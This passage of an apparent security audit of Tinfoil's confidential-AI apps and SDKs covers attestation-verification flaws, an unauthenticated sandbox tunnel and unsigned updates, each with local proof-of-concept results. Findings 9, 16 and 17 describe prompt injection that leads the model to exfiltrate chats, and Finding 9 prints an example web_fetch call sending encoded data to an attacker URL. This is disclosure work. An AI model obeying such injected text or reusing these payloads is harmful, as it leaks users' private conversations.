The injection step itself (a production model obeying the instruction) was not exercised: no model runs
locally. That is the standard methodology for this class, which OpenAI, Google, Microsoft, Anthropic and
Mistral have all treated as a fixable vulnerability in their chat products.

### Severity

Per-vector CVSS 3.1 (verifiers disagreed on how to score model compliance):
- Document / web-search injection into a chat with sensitive context: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` = **7.5** if the model's compliance is not counted; `AC:H`/`UI:R` = **5.3–5.9** under the conservative reading.
- One-click `?q=` link: `AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N` = **5.4** (fresh chat only: personalization profile, system prompt, answer, IP).

Overall **High** for a product whose only promise is confidentiality; the attacker needs no Tinfoil
position at all. The `?q=` auto-submit on its own is a documented convenience (ChatGPT ships the same)
and is reported only as the delivery leg.

### Fix

- Do not load third-party images from model output. Options: drop `img`/`picture`/`source` from the
  sanitize schema and render only `data:`/`blob:` images; or proxy images through the attested metadata
  enclave (as favicons already are) with a click-to-load gate; and tighten the CSP to `img-src 'self'
  data: blob:` plus the enclave origin. Apply the same to `ThoughtProcess`, `ArtifactPreview`, the
  markdown code-fence preview and the GenUI `render_image`/`render_link_preview` widgets.
- Make `?q=` / `#send=` prefill the composer instead of sending, or require a confirmation.

### Unverified production facts

That chat.tinfoil.sh serves exactly the `vercel.json` CSP (the repo's own csp-policy test says the
WEBCAT manifest pins it); which GenUI widgets the control plane enables; how often production models
follow the injection. No production traffic was sent.

---

## Finding 7: the unauthenticated gateway catalog chooses which `tinfoilsh/*` code a `NewGateway` client trusts (High)

**Component:** `tinfoil-go` HEAD `ef79d8e` (= `v0.17.0-rc.1`): `gateway_catalog.go:17,43-50`
(`trustedRepoOwner = "tinfoilsh/"`; `FetchCatalog` keeps any entry whose repo is a bare slug with that
prefix), `seal_transport.go:73-89` (`gatewayPolicy.resolve` returns `replica{ref: entry.Repo}` for every
unpinned model), `gateway.go:74-91` (`enclave.NewHandle(r.host, r.ref).ViaRelay(gateway)`),
`enclave/verify.go:38` (`VerifyV3(doc, nonce, <catalog repo>)`), `verify/internal/provenance/provenance.go:121-131`
(the only accepted signing identity is derived from that string: any workflow file of that repo on any
`refs/tags/*`), `freshness.go:50-78`. Same shape in the versions consumers pin: `v0.16.1` (tinfoil-proxy
`74d105c`, latest tag `v0.3.0-rc.2`) and `v0.15.8-0.20260924012310-ff60af7e9ea6` (confidential-openai-adapter
`b490cb2`, whose `trusted()` is a bare `HasPrefix` and whose `NewGateway` has no pin support at all).

### Root cause

In gateway mode the client asks the (unattested) gateway which repository each model's enclave runs and
verifies the enclave's attestation against *that* repository. The only constraint is the GitHub org
prefix. Nothing in the verifier, the provenance layer or the freshness witness distinguishes inference
services from Tinfoil's other signed deployments. Tinfoil publishes, signs and freshness-witnesses
dev-box configurations whose measured config grants their administrator root over the CVM:
`tinfoilsh/confidential-ubuntu-tinfoil-config` v0.1.1 and `tinfoilsh/confidential-ubuntu-config` v0.1.2
(`cvm_admin: true`, `ports: ["22:22"]`, `upstream-port: 22`, `authenticated: false`; witnessed
2026-10-07T18:03Z, valid to 2026-10-14). A catalog entry
`{"llama3-3-70b": {"repo": "tinfoilsh/confidential-ubuntu-tinfoil-config", "hosts": ["<dev box>"]}}`
therefore passes every check, and the client seals every request body with EHBP to the dev box, whose
shim decrypts it and hands the plaintext to whatever the administrator runs on the measured upstream port
inside their own container. The administrator can forward the request to a real model and return a
genuine-looking answer. No new signed artifact, key compromise or repository change is needed, no error
is raised and no transparency-log record is created.

### Who can exploit it

| Attacker | Needs | Affected clients |
|---|---|---|
| Tinfoil (gateway operator) or an insider | Nothing new: the gateway plus a witnessed `cvm_admin` dev box on endorsed hardware, both of which exist today | `tinfoil-proxy` CLI/desktop in its default unpinned mode, `confidential-openai-adapter` (cannot pin), any `tinfoil.NewGateway` user without `PinnedModelsOnly` |
| External party | A compromised gateway or a WebPKI certificate for it **plus** administrative access to an attested `cvm_admin` CVM (e.g. a rented `confidential-sandbox-gpu` while its witness is fresh) | same |

Not affected: `NewClient` / `NewClientWithOptions` with an explicit repo (including the Tinfoil Chat
harness) and the JS, Python, Rust and Swift SDKs, which have no gateway catalog.

This is exactly the "not even Tinfoil" promise that `tinfoil-proxy`'s README makes: "neither the gateway
nor any other intermediary can read them", "verified against the public attestation transparency log".

### Proof of concept (local only; `gateway-catalog-any-repo/evidence/`)

Public artifacts only (GitHub release assets and attestations; no Tinfoil host contacted). Three Go
tests in a copy of tinfoil-go, plus a verifier's end-to-end test of the shipped `NewGateway` pipeline:

- Test A: the public dev-box releases pass `AuthenticateCode` and the freshness witness for their own repo
  name ("ACCEPTED code artifact: repo=tinfoilsh/confidential-ubuntu-tinfoil-config tag=v0.1.1 …
  freshness witness: ACCEPTED, witnessed at 2026-10-07T18:03:26Z").
- Test B: a loopback HTTPS gateway serving a catalog that maps `llama3-3-70b` to that repo:
  `FetchCatalog kept: … (trusted()=true)`, `replica.ref="tinfoilsh/confidential-ubuntu-tinfoil-config"`,
  `NewGateway(...).Serves(model)=true`.
- Test C: the whole reference-values layer of `VerifyV3` accepts the dev-box release; the
  `confidential-model-router` control is rejected with the expected SAN mismatch.
- Verifier Test D: the shipped `NewGateway` chain against a loopback gateway that relays a nonce-bound v3
  document for the dev box proceeds through catalog, provenance and freshness and stops only at the
  hardware-quote layer, which needs a genuine quote from the dev box's endorsed machine (only its owner
  can produce one; the quote layer checks measurement, platform policy and VM shape, none of which encode
  a workload role).

### Severity

**High.** Tinfoil or insider: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` = **7.5** (9.1 if attacker-authored
completions are counted). External attacker with a compromised gateway and a dev box: `AC:H`,
`PR:H` = **6.4**.

### Fix

Do not let the catalog choose the repository: ship an allow-list of inference repositories, or sign the
catalog under a pinned identity; make `--pinned-only` the default in tinfoil-proxy and add pin support to
the adapter; have the verifier reject artifacts whose measured config declares `cvm_admin`, a debug
toolbox or an unauthenticated SSH upstream unless the caller opts in; stop issuing freshness witnesses for
non-inference repositories under the same witness identity, or add a `role` predicate that gateway
clients require.

### Unverified production facts

That `inference-gateway.tinfoil.sh` serves `/catalog` in the `FetchCatalog` shape and relays attestation
fetches for arbitrary hosts (inferred from the shipped proxy and adapter code paths); that a dev-box CVM
answers the v3 attestation endpoint with HPKE material (same shim, `publish-attestation` default on).

---

## Finding 8: tinfoil-go accepts unsigned Intel TDX collateral because go-tdx-guest enforces a case-variant JSON member that Intel's signature does not cover (Critical impact; CVSS 7.4 to 9.1)

**Component:** `tinfoil-go` HEAD `ef79d8e` (= `v0.17.0-rc.1`, also the `Tinfoil.xcframework` pinned by
tinfoil-swift `Package.swift:22`) and `v0.16.1` (pinned by tinfoil-proxy): `verify/internal/quote/tdx/authenticate.go:93-109,170-201`
(document-carried PCS responses are replayed into go-tdx-guest unchanged). Root cause in the dependency
`github.com/google/go-tdx-guest` `v0.3.1` `verify/verify.go:371-440` (`getTcbInfo` / `getQeIdentity`),
`:333-347` (`bodyToRawMessage`), `:1136-1242` (`verifyResponse`, `verifyTCBinfo`, `verifyQeIdentity`).
Every Go consumer of `VerifyV3` / `enclave.Handle` / `mobile.Verifier.Verify` is affected: the Tinfoil Chat
harness, the model router's upstream checks, the keyserver, tinfoil-cli, tinfoil-proxy, the iOS/Swift SDK.

### Root cause

go-tdx-guest parses each Intel PCS response **twice with different semantics**:

1. `json.Unmarshal(body, &collateral.TdxTcbInfo)` uses `encoding/json` v1, which matches object members
   **case-insensitively** and decodes a later matching member into the same struct field **in place**.
   `{"tcbInfo": <genuine>, "tcbinfo": <forged>, "signature": <genuine>}` therefore yields the genuine
   object with every member present in the forged object overridden (`tcbLevels`, `tdxModuleIdentities`,
   `nextUpdate`, `fmspc`, …; for QE Identity: `mrsigner`, `isvprodid`, `attributes`, `miscselect`,
   `tcbLevels`, `nextUpdate`).
2. `bodyToRawMessage("tcbInfo", body)` builds a `map[string]json.RawMessage` and returns the **exact-key**
   member, so the ECDSA check (`CheckSignature(ECDSAWithSHA256, rawBody, sig)`) runs over the genuine
   bytes and succeeds.

Everything enforced afterwards (`checkTcbInfoTcbStatus`, `verifyTdQuoteBody`, `verifyQeReport`,
`checkCollateralExpiration`) reads the merged struct. tinfoil-go hands the document-carried bodies through
unchanged; its own `tcbEvaluationRecorder` uses `encoding/json/v2` (case-sensitive) but only to record the
evaluation number. Exact duplicate keys are **not** exploitable in Go (last-wins applies to both decodes,
so the forged copy fails the signature), which is why Finding 2's analysis said "Go/V3 is not affected".
The case-variant member is a different mechanism. A 40-line stand-alone Go test
(`go-tdx-collateral-casefold/evidence/minimal-go-json-check/`) reproduces the two decode semantics.

### Who can exploit it

| Attack | Attacker | Result |
|---|---|---|
| TCB-status / collateral-freshness forgery | Whoever serves the attestation document to the client: in document-carried collateral mode (tinfoil-go ≥ v0.16.1, HEAD, the Swift xcframework, tinfoil-proxy) that is the TLS peer before pinning, i.e. Tinfoil's unattested gateway in gateway mode, a configured proxy, or a WebPKI-certificate-capable on-path party in direct mode. No access to `tdx-proxy.tinfoil.sh` is needed. | Any out-of-date or vulnerable TDX platform (microcode / TDX-module / QE SVNs below Intel's current TCB) is accepted as `UpToDate`, and expired collateral is accepted indefinitely (overridden `nextUpdate`). The TCB/SVN policy and the collateral freshness checks are void. |
| Full TDX attestation bypass | The same document control **plus** root on the host OS of an endorsed TDX machine (the party TEEs exist to exclude: the cloud/bare-metal operator or a physical insider). Under Flexible Launch Control the host owner decides which enclaves get PROVISIONKEY, so the platform's PCE certifies an attacker QE; the forged QE Identity (`mrsigner` = attacker) is what the verifier enforces. | A forged v3 document with any MRTD/RTMRs matching the endorsed code and platform measurements and `REPORT_DATA` binding attacker-chosen TLS and HPKE keys is accepted as a genuine Tinfoil enclave. The client pins the attacker's TLS key or seals EHBP bodies to the attacker's HPKE key; every prompt, response and `user_cache_secret` is readable by the host. |

The fake-QE step relies on the documented DCAP/FLC property and was exercised with tinfoil-conformance's
synthetic Intel root/PCK chain, not on hardware. The TCB-forgery path was exercised with a **real Intel
production quote and real Intel-signed collateral against the embedded Intel root at the real clock**.

### Proof of concept (local only; `go-tdx-collateral-casefold/evidence/`)

`run-pocs.sh` runs four stages (outputs under `hunter/outputs/`):

- PoC 1, go-tdx-guest v0.3.1 library level, real Intel quote + real collateral, current clock: control
  `TestControl_GenuineCollateral` fails with "no matching TCB level found"; `TestForged_TcbInfoCaseVariant`
  (unsigned `tcbinfo`/`enclaveidentity` members appended) returns `err=<nil>`; an unsigned
  `enclaveidentity.mrsigner=abab…` is **enforced** ("MRSIGNER value(dc9e…) in QE Report is not equal to
  MRSIGNER value(abab…) in Intel PCS's reported QE Identity"); `TestControl_ExactDuplicateKeyIsRejectedInGo`
  shows exact duplicates fail the signature.
- PoC 2 / 2b, tinfoil-go HEAD and v0.16.1 production builds, `verify/internal/quote/tdx.Authenticate`:
  genuine collateral rejected; forged accepted — "ACCEPTED: identity(PPID)=089ddfdb… tcbEvaluationDataNumber
  (recorded from signed member)=20", MRTD/RTMRs returned.
- PoC 3, the full `Verifier.VerifyV3` through the shipped conformance adapter on a fake-QE document:
  `fakeqe-control` → `{"accepted": false, "rejection": {"code": "QUOTE_REJECTED"}}`;
  `fakeqe-casefold-derived` (same document plus an unsigned `"enclaveidentity":{"mrsigner":"EE..EE"}`;
  signed member and signature byte-identical) → `{"accepted": true}` with the attacker's
  `tls_public_key_fp` and `hpke_public_key`.

A verifier reproduced all stages from the pristine module cache and repos with its own controls.

### Severity

**Critical** for TDX deployments. Host-root attacker (full bypass): `AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N`
= **8.5–9.0**. Document-server attacker (TCB downgrade only): `C:H` only when combined with a platform
vulnerability, otherwise an integrity-of-policy issue, roughly **6.5–7.5**. SEV-SNP deployments are not
affected (the AMD path has no JSON collateral).

**This is an upstream bug in `google/go-tdx-guest`** (any Go verifier that feeds PCS collateral through
`getTcbInfo`/`getQeIdentity` is affected). Google should be notified in parallel.

### Fix

In go-tdx-guest, decode the PCS body with a case-sensitive, duplicate-rejecting decoder (`encoding/json/v2`
with `RejectUnknownMembers`/`MatchCaseSensitiveDelimiter`) **and** verify the signature over the exact
bytes that are decoded (decode the struct **from** the raw member returned by `bodyToRawMessage`, after
checking the top-level object has exactly the expected members). In tinfoil-go, as a defence in depth,
canonicalise document-carried PCS bodies before handing them to the library: parse with json/v2, reject
unknown/duplicate/case-variant members, re-serialise, and re-check the signature. Add conformance vectors
for the case-variant member to tinfoil-conformance.

### Unverified production facts

Which Tinfoil model enclaves run on TDX hosts and who operates those hosts; that production TDX documents
carry `intel-pcs` collateral entries produced by Tinfoil's collaterals service (verified in cvmimage code,
not observed against production).

## Finding 9: the Tinfoil Chat harness auto-executes model-chosen `web_fetch` and link-preview URLs, so an injected web page exfiltrates the conversation through the enclave's own tool traffic (High)

**Component:** `confidential-tinfoil-harness` HEAD `4c170c6`: `agent.go:109-127,195-274` (every model
tool call is appended and executed; no allow-list, confirmation or URL policy), `tools.go:35-66`
(`web_fetch` offered whenever the web-search family is on, which is the default; the only mitigation is one
system-prompt sentence at `tools.go:55`), `widgets.go:65-82` (`render_link_preview` executed server-side).
`confidential-websearch` HEAD `e3751cf`: `internal/server/handlers.go:202-204` and `internal/fetch/fetch.go:130-132`
(every URL forwarded verbatim to Exa `/contents` with `maxAgeHours: 2`, which forces a live crawl of unseen
URLs), `internal/tools/service.go:236-251,360-364` (the prompt-injection classifier is **skipped** when the
host's eTLD+1 is in the top-500k list and the caller sent no `X-Tinfoil-Tool-Injection-Check` header, which
the harness never sets; the classifier is also fail-open), PII filter disabled for fetch.
`confidential-website-metadata-fetcher` HEAD `8f0fd7e`: `client.go:68-72` (scrapes the model-chosen URL
through context.dev with `maxAgeMs=0`, no classifier).

### Root cause

The model's context (system prompt with personalization, project instructions and documents, prior
messages, uploaded document text) is under the attacker's influence as soon as the assistant reads
attacker-authored text. The harness then runs any `web_fetch`/`render_link_preview` call the model
emits. A URL whose query string carries the conversation is fetched by Exa's or context.dev's crawler,
i.e. the data reaches the attacker's server **from inside the enclave's normal egress**, while the victim
receives a normal-looking answer. Unlike Finding 6 this needs no browser: it works for the iOS app and
any client of the harness, and the data leaves through attested infrastructure.

### Who can exploit it

Any third party who can get text in front of the model: the author of a page the user pastes a link to,
a page or snippet that `web_search` returns (snippets from top-500k hosts are never screened; a page
hosted on github.com, medium.com or similar passes), or a document the user uploads. No account, network
position or Tinfoil infrastructure is needed. The model must follow the injected instruction.

### Proof of concept (local only; `harness-webfetch-injection-exfil/evidence/`)

Loopback deployment of the unmodified harness and websearch service with an Exa stub, a top-500k ranker
stub, a scripted model and an attacker web server (`run.sh`, `out/*.log`):

- Scenario 1 (poisoned page on github.com): the harness auto-executes
  `web_fetch({"urls":["https://github.com/attacker/collect?d=W3N5c3RlbV0g…"]})`; the attacker server
  receives two requests from the crawler and the decoded plaintext contains the system prompt with
  `<nickname>Dr. Alice Example</nickname>`, "CONFIDENTIAL PROJECT DOCUMENT: Q4 acquisition target is ACME
  Corp" and the prior user message "my patient John Q. Public, SSN 123-45-6789". The stored assistant
  reply is a normal summary. `websearch.final.log` shows `X-Tinfoil-Tool-Injection-Check=""` on every
  harness request and no classifier call.
- Scenario 2 (same page on a long-tail host): the classifier runs, flags it, and nothing leaks (control).
- `metadata-channel-test.log`: `render_link_preview` makes the metadata enclave scrape a model-chosen URL
  (second channel, no classifier).

Three verifiers reproduced it from pristine repos (`diff -rq` shows no shipped file modified).

### Severity

**High**: `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N` = **7.1–7.5** (the injection source needs the user to ask
about or upload the content; scope changes because the leak crosses the enclave boundary). Standard
caveat: production model compliance was not measured.

### Fix

Do not let the model choose fetch targets freely: require user confirmation or an allow-list derived from
URLs the user supplied; strip query strings/fragments from model-authored fetch URLs or fetch only URLs
that appeared verbatim in user turns or search results; always run the injection classifier (remove the
top-500k skip, fail closed); apply the same policy to `render_link_preview`/metadata scrapes; and
prefer "fetch by search-result id" over free-form URLs.

## Finding 10: tinfoil-js accepts Sigstore bundles whose Rekor entry is completely unsigned (Medium)

**Component:** `tinfoil-js` HEAD `bedbe69` (= published `@tinfoilsh/verifier` 1.2.2 / `tinfoil` 1.2.2,
used by the Tinfoil Chat web app): `packages/verifier/src/sigstore.ts:63-109` delegates every transparency
log check to `@freedomofpress/sigstore-browser` **0.1.14** (locked), whose `verifyInclusionPromise` only
checks a SET when `inclusionPromise.signedEntryTimestamp` is present, otherwise merely requires that some
`inclusionProof` object exists, then trusts the **unsigned** `integratedTime` as the certificate time
anchor; `verifyInclusionProof` recomputes a Merkle root from attacker-supplied values and verifies the
checkpoint signature only `if (entry.inclusionProof.checkpoint)`; `tsaThreshold` is 0. Upstream fixed
this silently in 0.1.15; tinfoil-js still resolves 0.1.14.

**Attacker:** whoever serves the attestation bundle (`atc.tinfoil.sh`, `github-proxy.tinfoil.sh`, or a
WebPKI-capable MITM of them) **plus** an ephemeral Fulcio signing key for a tagged release run of
`tinfoilsh/confidential-model-router` (10-minute cert). With that key an attacker signs arbitrary
`snp_measurement` statements forever, unlogged: combined with an attacker-run SEV-SNP enclave the browser
SDK reports `securityVerified=true` and seals prompts to the attacker's HPKE key. Without such a key the
Fulcio chain still holds, which keeps this at **Medium** (`AC:H`, `PR:H`): the transparency property is
void and a release-pipeline compromise becomes exploitable later without a Rekor record.

**PoC:** `js-sigstore-tlog-unsigned-entry/evidence/`: `rekor-bypass.mjs` — unmodified fixture accepted;
tampered checkpoint and tampered SET rejected (controls); **no SET, no checkpoint, self-made Merkle proof,
bogus logId/logIndex/integratedTime → ACCEPTED, securityVerified=true**; `integratedTime = cert notAfter`
accepted, one second later rejected. `sdk-level-forged-atc-output.txt`: `SecureClient.ready()` against a
loopback ATC serving the forged bundle resolves with all steps `success`. tinfoil-go rejects the same
bundle ("inclusion proof missing required checkpoint"). Three verifiers confirmed. A conformance vector
(094) is provided.

**Fix:** bump to sigstore-browser ≥ 0.1.15 (or require a verified SET or checkpoint and a trusted
timestamp in tinfoil-js itself), and add the vector to tinfoil-conformance.

## Finding 11: tinfoil-python re-sends a one-shot-body POST as an unencrypted, bodyless request after a forged key-rotation error and accepts the peer's forged plaintext 200 (Medium)

**Component:** `tinfoil-python` 0.14.0 (latest; byte-identical to HEAD `00fe2fe` in the relevant class):
`src/tinfoil/client.py` `_EHBPReVerifyingTransport.handle_request` (wheel L402-453, retry at L445; async
L488) with `tinfoil-ehbp` 0.4.0 `transport.py:170-178`.

**Root cause:** on `KeyConfigMismatchError` (any TLS peer can forge the 422 problem+json that triggers it)
the transport re-attests and retries with the **same** `httpx.Request`, whose one-shot stream the first,
encrypted attempt already consumed. The EHBP transport decides "bodyless" by peeking the stream, so the
retry goes out with `Content-Length: 0`, no `Ehbp-Encapsulated-Key`, and its response is returned
**without any nonce check** (SPEC 7.4 bodyless pass-through). The peer's forged nonce-less 200 is delivered
to the application as the authenticated reply to a sealed POST, and the user's real request is silently
dropped. Go, JS, Rust and Swift do not share this shape.

**Attacker:** the client's TLS peer (proxy/gateway operator by design with `base_url=`, or a
WebPKI-capable on-path party in direct mode). Integrity only; no plaintext is sent.

**Exposure:** callers of the documented `make_secure_http_client()` / async variant that pass one-shot
bodies (`content=open(f,'rb')`, iterators, `BytesIO`). The OpenAI-SDK JSON and seekable multipart paths
re-encrypt on retry and are safe. Three verifiers confirmed on the PyPI wheels (sha256-checked).

**PoC:** `python-rekey-bodyless-downgrade/evidence/` (`poc_retry_bodyless.py`, logs): control `content=bytes`
→ retry re-encrypted, forged 200 rejected with `MissingResponseNonceError`; `content=open(file,'rb')` /
`iter([...])` / `BytesIO` → retry has `has_ehbp_header=False content_length='0'` and the client returns
`status=200 body='{"id": "forged", … "ATTACKER-CHOSEN ANSWER" …}'`.

**Fix:** refuse to retry when the request stream cannot be replayed (as tinfoil-go does when `GetBody` is
nil), or rebuild the request from a replayable source; never fall back to the bodyless pass-through for a
request that originally had a body.

## Finding 12: confidential-sync derives attachment keys from control-plane-visible metadata plus a hash of the plaintext, so the operator can confirm or recover guessable attachments through the unauthenticated public read route (Medium)

**Component:** `confidential-sync` HEAD `4acbf16`: `internal/server/attachment_ops.go:94-133`
(`deriveAttachmentMaterials`: both the attachment id and the AES-256 slot key are
`HKDF-SHA256(salt=nil, IKM=len-prefixed(idempotency_key, chat_id, clerk_sub, hex(sha256(plaintext))))`;
the comment says "No CEK material flows on this request"), `fork_ops.go:277-303` and
`import_ops.go:434-437` (fork/import idempotency keys are derived from values the control plane receives
or indexes), `http.go:123` (`/v1/attachment/get-public` returns the plaintext to anyone presenting
`(id, key)`), `controlplane/client.go:426-427` (`X-Idempotency-Key` forwarded to api.tinfoil.sh).

**Root cause:** no secret enters the attachment key. For fork- and import-created attachments every
input is visible to the control plane (idempotency key header, chat id in the blob path, Clerk user id,
attachment index). The key is therefore `F(CP-visible metadata, plaintext)`: the operator can test a
candidate plaintext offline (derived id == stored id) and, for low-entropy or known files, call the
enclave's public route with the derived key and receive the bytes.

**Attacker:** Tinfoil's control-plane operator or anyone with read access to its database/request logs.
Breaks the README promise that "neither Tinfoil nor the storage layer can read chats" for attachments
whose content is guessable (short documents, known images, templates). High-entropy files stay protected,
which keeps it at **Medium** (`AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:N/A:N` ≈ 4.9–5.3).

**PoC:** `sync-attachment-key-derivable/evidence/`: a Go test on the unmodified enclave + stub control
plane ("SCENARIO B: derived id ad2028d2… == CP-visible attachment id (plaintext guess confirmed
offline, no enclave call)", "unauthenticated get-public with CP-derived key returned the plaintext",
wrong key → 400) and a real-binary run against the real S3 encryption sidecar and moto
("UNAUTHENTICATED get-public: 200 b'\x89PNG known-file-bytes…'"). Three verifiers confirmed.

**Fix:** mix a secret the control plane never sees into the derivation (the user's CEK, or an
enclave-held per-user secret released only to attested sync enclaves) and require authentication or a
capability token on the public read route.

## Finding 13: tinfoil-python accepts a PCK CRL from any Intel-rooted CA, so a revoked PCK certificate can be hidden (Medium)

**Component:** `tinfoil-python` 0.14.0 (= HEAD `00fe2fe`): `src/tinfoil/attestation/collateral_tdx.py:946-983`
(`_verify_crl_signature` checks only that the header issuer chain roots at the pinned Intel SGX Root CA
and that `issuer_chain[0]` signed the CRL; `crl.issuer` is never compared with the PCK's issuer and
`ca_type` is only used for the URL and the cache file), `:1908-1960` (`validate_certificate_revocation`
looks the PCK serial up in whatever CRL came back).

**Root cause / attack:** the collateral path serves Intel's genuine **Processor** CA CRL in place of the
**Platform** CA CRL (or vice versa). Both are Intel-signed, so the check passes, but the revoked serial
cannot appear in the wrong CA's CRL and the cache persists the substitution. Attacker: the collateral
delivery path (`tdx-proxy.tinfoil.sh`, i.e. Tinfoil, or a WebPKI-capable MITM of it) **plus** a PCK
private key that Intel has revoked. tinfoil-go binds the CRL issuer and is not affected. **Medium**
(revocation exists precisely for the post-compromise case; precondition is heavy).

**PoC:** `python-pck-crl-issuer-not-bound/evidence/`: genuine Intel artifacts fetched 2026-10-08
("fetch_collateral() for a Platform-CA PCK: ca_type='platform' but CRL issuer CN = 'Intel SGX PCK
Processor CA' -> ACCEPTED"; control with the genuine platform CRL → "PCK certificate has been revoked";
substituted CRL → accepted). Three verifiers confirmed.

**Fix:** require `crl.issuer == pck_cert.issuer` and that the CRL signer is the PCK's issuing CA.

## Finding 14: the agent-sandbox shim tunnels anonymous CONNECT requests to all sixteen published ports (Medium, acknowledged in a config comment)

**Component:** `confidential-agent-sandbox` HEAD `d78ec38` `tinfoil-config.yml:50-66,87-93`
(ports 22, 3000, 3001, 4000, 5000, 5173, 8000, 8001, 8888, 9000, 9222, 3389, 5900, 3306, 5432, 6379;
`shim: authenticated: false`); `cvmimage` HEAD `58b08de` `cmd/shim/main.go:259-290` (a key validator is
built only when `authenticated: true`), `api.go:246-266` (CONNECT is authorised only when a validator
exists), `tunnel.go:50-101` (dials `127.0.0.1:<port>` for every published port; 404 for unpublished
ones, so ports can be enumerated). Owner-only gating exists only in `tinfoil-cli` (seal/RTMR3 check),
never on the enclave side.

**Impact:** anyone on the internet who learns a sandbox hostname (per-boot public certificates appear
in CT logs) can connect to whatever the owner's agent runs on those ports: password-less dev databases
(Redis, Postgres/MySQL in docker), dev web/file servers exposing the project tree, Chrome DevTools
(9222: cookies, logged-in sites), VNC/RDP. Port 22 stays protected by the enrolled SSH key. Tinfoil's
own comment in the config (lines 44-49) says the tunnel "answers to anyone who knows the domain", so
this is an acknowledged design gap rather than an accidental bug; the sandbox README and the CLI help
("sealed to your disk key") do not convey it. **Medium** (`AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N` = 6.5
when a service listens; nothing listens by default).

**PoC:** `sandbox-tunnel-no-auth/evidence/`: the shipped `NewShimServer` with `validator=nil` and the 16
ports parsed from the real config; HTTP/2 CONNECT with no headers reaches stub services on all 16 ports
("RESULT: an unauthenticated internet client reached a service on all 16 published sandbox ports");
`authenticated: true` controls → 401/404. Verified 2/3 (one verifier rated it Low as acknowledged).

**Fix:** require the owner's API key or a seal-bound credential on CONNECT even when `authenticated` is
false for HTTP paths, and document the exposure.

## Finding 15: the Tinfoil Proxy desktop app auto-installs unsigned updates on Windows and Linux (Medium, hardening)

**Component:** `tinfoil-proxy` HEAD `74d105c` `app/src/main/updater.ts:13-14,37-42` (`autoDownload`,
`autoInstallOnAppQuit`, check at start and every 6 h), `app/electron-builder.yml` (no `win.publisherName`
or certificate), `.github/workflows/release.yml:111-128` (only macOS is signed/notarized; Windows and
Linux jobs get `GH_TOKEN` only). electron-updater 6.8.9 skips Authenticode verification entirely when
`app-update.yml` has no `publisherName`; the Linux updater installs the `.deb` through pkexec/sudo with
no signature check. The shipped v0.2.3 installer, bundled proxy binary and `app-update.yml` carry no
signature (verified on the public artifacts).

**Impact:** whoever can serve attacker-chosen release metadata and installer through the GitHub feed
(compromised maintainer account/token, GitHub itself, or a TLS-capable MITM of api.github.com /
objects.githubusercontent.com) gets code execution on every Windows/Linux desktop user (root on Linux),
defeating every confidentiality property the proxy provides. The precondition is control of a trust
anchor, so one verifier rated it Low (hardening); two rated it Medium. Reported as **Medium /
hardening**.

**Fix:** sign Windows builds and set `publisherName`; sign Linux packages or verify a detached signature
in the updater; consider pinning the update feed's signing key independently of GitHub.

## Finding 16: the artifact sandbox origin lets model-authored artifacts and previews reach arbitrary HTTPS hosts (Medium)

**Component:** `tinfoil-webapp-sandbox` HEAD `54ed549` (deployed as webapp-sandbox.tinfoil.sh):
`vercel.json:47,62` (`img-src https: data: blob:; media-src https: data: blob:; font-src https: data:;
frame-src https: data:` for both host blocks), `preview.js:71-73` (the `artifact` kind runs as raw
`srcdoc` with no per-kind `<meta>` CSP, so it inherits the header policy), `preview.js:42-69` (html/js
kinds get a `<meta>` CSP, but `location.href = …` navigates the nested frame and is subject only to the
parent's `frame-src https:`), `README.md:73-77` ("none of them can reach the network", which is false).

**Attacker / interaction:** same as Finding 6 (prompt injection or malicious model output) plus one
click on "Preview" for an HTML artifact or a ```html / ```javascript code block. Everything the model
placed in the artifact (which an injection can make be the conversation) leaves to any https host
(`<img>`, `<iframe>`, `@font-face`, self-navigation), and an attacker page can be framed inside the
"verified" chat UI. Strictly weaker than Finding 6 but a separate component with a separate fix that
stays open after the chat origin is fixed. **Medium** (`AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N` ≈ 6.5).

**PoC:** `webapp-sandbox-origin-exfil/evidence/hunter/poc/sandbox-exfil.mjs` (headless Chromium under
the shipped headers): `[LEAK] artifact: <img>`, `<iframe>` (the framed attacker page then `fetch()`es
home freely), self-navigation, `@font-face`; `[LEAK] html preview` and `js preview` via self-navigation;
`fetch()` from the artifact and `<img>` in the html preview correctly blocked (controls). With the
proposed hardened CSP all nine attack cases are blocked while the three legitimate flows keep working
(`sandbox-exfil-run-hardened-csp.log`). Three verifiers confirmed; reachability of the artifact kind
depends on the control plane enabling `render_artifact_preview`.

**Fix:** `default-src 'none'; img-src data: blob:; font-src data:; media-src data: blob:; frame-src
'none'` (plus the self-origin allowances the previews need), inject the per-kind `<meta>` CSP for the
artifact kind too, and add `allow-scripts`-only sandboxing on the nested runner frame.

## Finding 17: the Tinfoil iOS app auto-fetches model-authored remote images (High; static trace, 3/3 verified)

**Component:** `tinfoil-ios` HEAD `cd5824e`: `TinfoilChat/Views/LaTeXMarkdownView.swift:22-36`
(assistant markdown rendered with Textual's `StructuredText(markdown:)` and no image-loader override),
render sites in `MessageView.swift`; Textual 0.0.11 as pinned in `Package.resolved`:
`Sources/Textual/Attachment/AttachmentLoader.swift:59-62` (default loader is `.image()`),
`URLAttachmentLoader.swift:19-28`, `Internal/Image/ImageLoader.swift:20-86` (`URLSession.default`),
`WithAttachments.swift:33-95` (`.task(id:)` resolves every `imageURL` run as soon as the string
renders, including mid-stream). GenUI: `GenUIStyle.swift:95-103` (`AsyncImage` on any https URL),
`Widgets/ImageWidget.swift:98-101`, `Widgets/LinkPreviewWidget.swift:116-124` (model URL posted to the
metadata enclave, which fetches it).

**Root cause / impact:** the iOS analogue of Finding 6. Every `![](https://…)` in an assistant turn is
fetched by the device the moment it renders, with no host restriction, consent or proxying, and the
fetch is repeated by every device that renders the synced chat. The same prompt-injection payloads
exfiltrate the chat, attached document text and the personalization profile plus the device IP.
Web search is opted in by the app (`ChatViewModel.swift:1746-1753`). No URL-scheme auto-submit exists
on iOS (checked), so the delivery vector is injected content only.

**Evidence:** `ios-swift/evidence/hunter/markdown-image-exfil-trace.txt` (205 lines of source excerpts
with line numbers through the whole chain). Not executed: no iOS toolchain or simulator is available,
and swift-corelibs on Linux has no Markdown `AttributedString` parser, so the on-device fetch is inferred
